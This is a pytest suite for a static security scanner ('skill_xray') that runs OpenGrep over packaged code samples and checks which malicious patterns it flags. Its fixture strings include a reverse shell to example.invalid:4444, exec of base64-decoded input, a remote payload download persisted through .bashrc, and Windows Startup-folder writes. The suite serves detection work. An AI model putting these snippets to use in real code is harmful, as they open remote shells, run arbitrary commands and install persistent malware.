"""Freeze the Phase-1 Python contract and batch it through pinned OpenGrep."""

from __future__ import annotations

import json
import os
from collections import Counter
from dataclasses import dataclass
from pathlib import Path

import pytest

from skill_xray import ingest, parse
from skill_xray.checks import coverage, taint_engine
from skill_xray.opengrep_bridge import check as opengrep_check
from skill_xray.opengrep_runtime import OpenGrepRuntimeError, resolve_opengrep


@dataclass(frozen=True)
class _Case:
    name: str
    code: str
    vector: str | None
    count: int


def _contract():
    path = Path(__file__).with_name("opengrep_python_contract.jsonl")
    return [_Case(**json.loads(line)) for line in path.read_text(encoding="utf-8").splitlines()]


def _actual(findings):
    return Counter((finding.path, finding.vector) for finding in findings if finding.vector)


def _live_executable():
    try:
        executable = resolve_opengrep(os.environ.get("SKILL_XRAY_OPENGREP_BIN"))
    except OpenGrepRuntimeError as exc:
        pytest.fail(str(exc))
    if executable is None:
        if os.environ.get("CI"):
            pytest.fail("pinned OpenGrep is required in CI")
        pytest.skip("pinned OpenGrep is not installed")
    return executable


def test_frozen_python_contract_has_expected_shape():
    cases = _contract()
    positives = sum(case.vector is not None for case in cases)
    # Dynamic indexes and explicit dynamic shell settings retain taint unless proven safe.
    assert (len(cases), positives, len(cases) - positives) == (258, 135, 123)
    assert len({case.name for case in cases}) == len(cases)


def test_live_opengrep_matches_frozen_python_contract(make_package):
    executable = _live_executable()
    cases = _contract()
    assert (len(cases), sum(case.vector is not None for case in cases)) == (258, 135)
    files = {
        "%03d_%s.py" % (index, case.name.removeprefix("test_")): case.code
        for index, case in enumerate(cases)
    }
    paths_by_name = {
        case.name: path for path, case in zip(files, cases, strict=True)
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
    expected = Counter({
        (path, case.vector): case.count
        for path, case in zip(files, cases, strict=True)
        if case.vector
    })
    overlap = next(path for path, case in zip(files, cases, strict=True)
                   if case.name == "test_base64_remote_dropper_fires")
    expected[(overlap, "SXV-019")] = 1
    findings = opengrep_check(parsed, executable=executable, timeout=90)
    gaps = [finding for finding in findings if not finding.vector]
    expected_gap_names = {
        "test_shadowed_dict_constructor_does_not_create_shell_proof",
        "test_local_kwargs_parameter_shadows_truthy_global",
        "kwargs-clean-2",
        *("mapping-update-False-%d-%d" % (index, index + 48) for index in range(7)),
        "test_dict_get_invalid_arity_is_clean",
        "test_dict_get_eager_side_effect_is_not_static_proof",
    }
    assert {
        (finding.path, finding.evidence.get("reason")) for finding in gaps
    } == {
        (paths_by_name[name], "dynamic-subprocess-kwargs")
        for name in expected_gap_names
    }
    actual = _actual(findings)
    assert actual == expected


def test_live_opengrep_keeps_three_nonliteral_positive_contracts(make_package):
    bomb = "import os\nos.system(" + "+".join(['"a"'] * 3000) + ")\n"
    skill = (
        "---\nname: t\nallowed-tools:\n  Bash: true\n---\n"
        "```python\nimport os, sys\nos.system(sys.argv[1])\n```\n"
        "```python\nfrom __future__ import annotations\nx = 1\n```\n"
    )
    files = {
        "SKILL.md": skill,
        "many.py": "import os\n" + "os.system(input())\n" * 100,
        "real.py": "import os, sys\nos.system(sys.argv[1])\n",
        "bomb.py": bomb,
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
    assert {finding.path for finding in findings if finding.vector == "SXV-008"} >= {
        "SKILL.md", "many.py", "real.py",
    }
    assert sum(
        finding.path == "many.py" and finding.vector == "SXV-008"
        for finding in findings
    ) == 25
    assert any(finding.path == "many.py" and finding.rule == "findings-capped"
               for finding in findings)


def test_live_lambda_sink_survives_production_coordinator(make_package):
    parsed = parse.parse_package(ingest.build_package(str(make_package({
        "lambda.py": "import os\n(lambda: os.system(input()))()\n",
        "direct.py": "import os, sys\nos.system(sys.argv[1])\n",
    }))))

    findings = taint_engine.check(parsed, executable=_live_executable())

    assert not [finding for finding in findings if not finding.vector]
    assert {
        (finding.path, finding.vector) for finding in findings
    } == {("lambda.py", "SXV-008"), ("direct.py", "SXV-008")}


def test_live_static_rules_reject_known_false_positives(make_package):
    files = {
        "gcs_download.py": (
            "from google.cloud import storage\n"
            "client = storage.Client()\n"
            "blob = client.bucket('datasets').blob('model.bin')\n"
            "blob.download_to_filename('/tmp/model.bin')\n"
        ),
        "sqlite_pty.py": (
            "import pty, sqlite3\n"
            "conn = sqlite3.connect('app.db')\n"
            "pty.spawn(['/bin/bash', '-lc', 'make build'])\n"
        ),
        "home_listing.py": "from pathlib import Path\nitems = list(Path.home().iterdir())\n",
        "authorized_keys_write.py": "open('/home/user/.ssh/authorized_keys', 'w').write('key')\n",
        "credential_write.py": "open('/home/user/.aws/credentials', 'w').write('safe')\n",
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert not [finding for finding in findings if finding.vector in {
        "SXV-023", "SXV-024", "SXV-025", "SXV-040",
    }]


def test_live_cloud_upload_sink_positive(make_package):
    code = (
        "import boto3\n"
        "client = boto3.client('s3')\n"
        "client.upload_file('/tmp/report.txt', 'bucket', 'report.txt')\n"
    )
    parsed = parse.parse_package(ingest.build_package(str(make_package({"upload.py": code}))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert [(finding.path, finding.vector) for finding in findings if finding.vector == "SXV-024"] \
        == [("upload.py", "SXV-024")]


def test_live_reverse_shell_pty_requires_a_constructed_socket(make_package):
    code = """\
import pty
import socket

sock = socket.socket()
sock.connect(('example.invalid', 4444))
pty.spawn('/bin/sh')
"""
    parsed = parse.parse_package(ingest.build_package(str(make_package({"reverse.py": code}))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert [(finding.path, finding.vector) for finding in findings if finding.vector == "SXV-040"] \
        == [("reverse.py", "SXV-040")]


def test_live_decoded_payload_sink_parity(make_package):
    files = {
        "builtins_exec.py": (
            "import base64, builtins\n"
            "builtins.exec(base64.b64decode(input()))\n"
        ),
        "kwargs.py": (
            "import base64, subprocess\n"
            "subprocess.run(base64.b64decode(input()), **{'shell': True})\n"
        ),
        "alias.py": (
            "import base64, os\n"
            "launch = os.system\nlaunch(base64.b64decode(input()))\n"
        ),
        "shadowed_alias.py": (
            "import base64, os\n"
            "launch = os.system\nlaunch = lambda value: value\n"
            "launch(base64.b64decode(input()))\n"
        ),
        "wildcard.py": (
            "import base64\nfrom subprocess import *\n"
            "run(base64.b64decode(input()), shell=True)\n"
        ),
        "shell_list.py": (
            "import base64, subprocess\n"
            "subprocess.run(['/bin/sh', '-c', base64.b64decode(input())])\n"
        ),
        "execv.py": (
            "import base64, os\n"
            "os.execv('/bin/sh', ['sh', '-c', base64.b64decode(input())])\n"
        ),
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
    paths = {finding.path for finding in findings if finding.vector == "SXV-019"}

    assert paths == {
        "alias.py", "builtins_exec.py", "execv.py", "kwargs.py", "shell_list.py",
        "wildcard.py",
    }


def test_live_native_argument_propagation_closes_common_wrapper_bypasses(make_package):
    files = {
        "join.py": "import os, sys\nos.system(' '.join(sys.argv[1:]))\n",
        "format.py": "import os, sys\nos.system('gzip {}'.format(sys.argv[1]))\n",
        "path_join.py": (
            "import os, sys\nos.system('rm -rf ' + os.path.join('/tmp', sys.argv[1]))\n"
        ),
        "str.py": "import os, sys\nos.system('echo ' + str(sys.argv[1]))\n",
        "decompress.py": (
            "import base64, zlib\n"
            "exec(zlib.decompress(base64.b64decode(input())))\n"
        ),
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert {finding.path for finding in findings if finding.vector == "SXV-008"} == {
        "decompress.py", "format.py", "join.py", "path_join.py", "str.py",
    }
    assert {finding.path for finding in findings if finding.vector == "SXV-019"} == {
        "decompress.py",
    }


def test_live_opengrep_keeps_four_incomplete_analysis_contracts_visible(make_package):
    files = {
        "deep.py": (
            "import os, sys\ncmd = sys.argv[1]" + " + 'a'" * 300
            + "\nos.system(cmd)\n"
        ),
        "broken.py": "def (: not valid python\n",
        "oversize.py": "import os\n# " + "x" * 600_000 + "\n",
        "bomb.py": "import os\nos.system(" + "+".join(['"a"'] * 3000) + ")\n",
    }
    parsed = parse.parse_package(ingest.build_package(str(make_package(files))))
    findings = [
        *coverage.check(parsed),
        *opengrep_check(parsed, executable=_live_executable(), timeout=90),
    ]
    assert any(finding.path == "deep.py" and finding.vector == "SXV-008"
               for finding in findings)
    reasons = {
        finding.path: finding.evidence.get("reason")
        for finding in findings
        if finding.rule == "analysis-incomplete"
    }
    assert reasons == {
        "bomb.py": "python_too_complex",
        "broken.py": "python_syntax_error",
        "oversize.py": "python_oversize",
    }


def test_live_remote_shell_rc_persistence_is_structurally_correlated(make_package):
    positive = """\
import os
import urllib.request

def install():
    payload = urllib.request.urlopen('https://example.invalid/payload').read()
    payload_path = os.path.join(os.path.expanduser('~'), '.worker')
    with open(payload_path, 'wb') as output:
        output.write(payload)
    os.chmod(payload_path, 0o755)
    startup_path = os.path.join(os.path.expanduser('~'), '.bashrc')
    with open(startup_path, 'a') as startup:
        startup.write(f'\\n{payload_path} &')
"""
    zsh_positive = positive.replace("'.bashrc'", "'.zshrc'")
    remote_without_persistence = """\
import os
import urllib.request
payload = urllib.request.urlopen('https://example.invalid/tool').read()
path = '/tmp/tool'
with open(path, 'wb') as output:
    output.write(payload)
os.chmod(path, 0o755)
"""
    local_startup_setup = """\
import os
def install(path):
    os.chmod(path, 0o755)
    startup_path = os.path.join(os.path.expanduser('~'), '.bashrc')
    with open(startup_path, 'a') as startup:
        startup.write(f'\\n{path} &')
"""
    unrelated_startup_write = """\
import os
import urllib.request
def install():
    payload = urllib.request.urlopen('https://example.invalid/tool').read()
    path = os.path.expanduser('~/.worker')
    with open(path, 'wb') as output:
        output.write(payload)
    os.chmod(path, 0o755)
    with open(os.path.expanduser('~/.bashrc'), 'a') as startup:
        startup.write('alias ll="ls -la"')
"""
    parsed = parse.parse_package(ingest.build_package(str(make_package({
        "positive.py": positive,
        "zsh-positive.py": zsh_positive,
        "download-only.py": remote_without_persistence,
        "local-startup.py": local_startup_setup,
        "unrelated-startup.py": unrelated_startup_write,
    }))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
    persistence = [finding for finding in findings if finding.vector == "SXV-039"]

    assert [(finding.path, finding.rule) for finding in persistence] == [
        ("positive.py", "opengrep-remote-shell-rc-persistence"),
        ("zsh-positive.py", "opengrep-remote-shell-rc-persistence"),
    ]


def test_live_windows_startup_write_is_structurally_correlated(make_package):
    startup_write = """\
from pathlib import Path
def install():
    startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
    (startup / 'worker.cmd').write_text('powershell -enc AAAA')
"""
    ordinary_appdata_write = """\
from pathlib import Path
def configure():
    config = Path.home() / 'AppData' / 'Roaming' / 'Acme'
    target = config / 'settings.json'
    with open(target, 'w') as output:
        output.write('{}')
"""
    parsed = parse.parse_package(ingest.build_package(str(make_package({
        "startup.py": startup_write,
        "config.py": ordinary_appdata_write,
    }))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
    persistence = [finding for finding in findings if finding.vector == "SXV-039"]

    assert [(finding.path, finding.rule) for finding in persistence] == [
        ("startup.py", "opengrep-windows-startup-persistence"),
    ]


def test_live_windows_startup_write_keeps_computed_target_coverage(make_package):
    startup_write = (
        "from pathlib import Path\n\ndef install():\n"
        "    startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' "
        "/ 'Start Menu' / 'Programs' / 'Startup'\n"
        "    target = startup / 'worker.py'\n"
        "    with open(target, 'w') as output:\n"
        "        output.write(\"exec(base64.b64decode('AAAA'))\")\n"
    )
    parsed = parse.parse_package(ingest.build_package(str(make_package({
        "computed.py": startup_write,
    }))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert [
        (finding.path, finding.rule)
        for finding in findings
        if finding.vector == "SXV-039"
    ] == [("computed.py", "opengrep-windows-startup-write")]


def test_live_windows_startup_read_is_not_persistence(make_package):
    startup_read = (
        "from pathlib import Path\n\ndef inspect():\n"
        "    startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' "
        "/ 'Start Menu' / 'Programs' / 'Startup'\n"
        "    target = startup / 'framework_config.json'\n"
        "    with open(target, 'r') as source:\n"
        "        return source.read()\n"
    )
    parsed = parse.parse_package(ingest.build_package(str(make_package({
        "read.py": startup_read,
    }))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert not [finding for finding in findings if finding.vector == "SXV-039"]


@pytest.mark.parametrize("mode", ["wb+", "w+b", "ab+", "a+b", "xb+", "x+b"])
def test_live_windows_startup_write_accepts_binary_update_modes(make_package, mode):
    startup_write = (
        "from pathlib import Path\n\ndef install():\n"
        "    startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' "
        "/ 'Start Menu' / 'Programs' / 'Startup'\n"
        "    target = startup / 'worker.py'\n"
        f"    with open(target, '{mode}') as output:\n"
        "        output.write(b\"exec(base64.b64decode('AAAA'))\")\n"
    )
    parsed = parse.parse_package(ingest.build_package(str(make_package({
        "write.py": startup_write,
    }))))

    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)

    assert any(finding.vector == "SXV-039" for finding in findings)
